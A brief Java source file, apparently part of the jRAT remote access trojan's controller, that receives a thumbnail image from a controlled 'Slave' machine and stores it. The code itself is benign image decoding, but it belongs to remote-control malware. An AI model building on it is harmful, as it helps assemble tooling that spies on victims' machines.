package jrat.controller.packets.incoming;

import jrat.common.utils.ImageUtils;
import jrat.controller.Slave;

import javax.swing.*;
import java.awt.image.BufferedImage;

public class Packet33Thumbnail implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		byte[] buffer = new byte[slave.readInt()];
		slave.getDataInputStream().readFully(buffer);
		
		BufferedImage image = ImageUtils.decodeImage(buffer);
		slave.setThumbnail(new ImageIcon(image));
	}

}
